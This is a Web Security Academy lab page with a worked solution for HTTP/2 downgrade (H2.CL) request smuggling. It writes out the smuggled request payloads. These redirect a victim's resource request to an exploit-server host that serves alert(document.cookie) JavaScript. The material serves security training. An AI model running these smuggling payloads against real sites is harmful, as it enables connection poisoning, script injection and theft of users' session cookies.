# Lab: H2.CL request smuggling

Source: https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling
Fetched: 2026-06-28T09:18:00.183572+00:00

Web Security Academy

Request smuggling

Advanced

Lab

Lab: H2.CL request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.

Hint

Solving this lab requires a technique that we covered in the earlier HTTP request smuggling materials

You need to poison the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, it will fetch your payload from the exploit server but not execute it. You may need to repeat the attack several times before you get the timing right.

Solution

Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header as follows. Remember to expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2 before sending the request.

POST / HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

Content-Length: 0

SMUGGLED

Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

Using Burp Repeater, notice that if you send a request for GET /resources, you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/.

Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header:

POST / HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

Content-Length: 0

GET /resources HTTP/1.1

Host: foo

Content-Length: 5

x=1

Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.

Go to the exploit server and change the file path to /resources. In the body, enter the payload alert(document.cookie), then store the exploit.

In Burp Repeater, edit your malicious request so that the Host header points to your exploit server:

POST / HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

Content-Length: 0

GET /resources HTTP/1.1

Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Content-Length: 5

x=1

Send the request a few times and confirm that you receive a redirect to the exploit server.

Resend the request and wait for 10 seconds or so.

Go to the exploit server and check the access log. If you see a GET /resources/ request from the victim, this indicates that your request smuggling attack was successful. Otherwise, check that there are no issues with your attack request and try again.

Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.

Community solutions

Jarno Timmermans

InfoSec

Find HTTP request smuggling vulnerabilities using Burp Suite

Try for free
